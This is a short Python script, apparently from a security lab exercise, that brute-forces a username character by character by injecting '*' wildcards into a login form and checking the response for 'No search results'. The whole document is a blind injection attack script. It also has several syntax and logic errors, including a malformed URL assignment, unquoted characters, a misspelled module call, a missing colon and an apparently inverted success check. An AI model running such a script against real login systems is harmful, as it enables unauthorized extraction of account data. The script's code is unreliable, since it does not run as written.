import requests

list = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z',
'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z',
'!','"','#','$','%',&,"'",'(',')','+',',','-','.','/',':',';','<','=','>','?','@','[',']','^',_','`','{','|','}','~','1','2','3','4','5','6','7','8','9','0'] 

url - ''
myobj = {'username': 'somevaliue', 'password': '*'}
result = ''

flag = 1
while flag == 1:
	flag = 0
	for l in list:
		myobj['username'] = result + l + '*'
		r = request.post(url, data = myobj, proxies = { "http" :"http://127.0.0.1:9001"})
		if ('No search results' in r.text)
			result += l
			flag = 1
			print(result)
			break
print('Finished!')
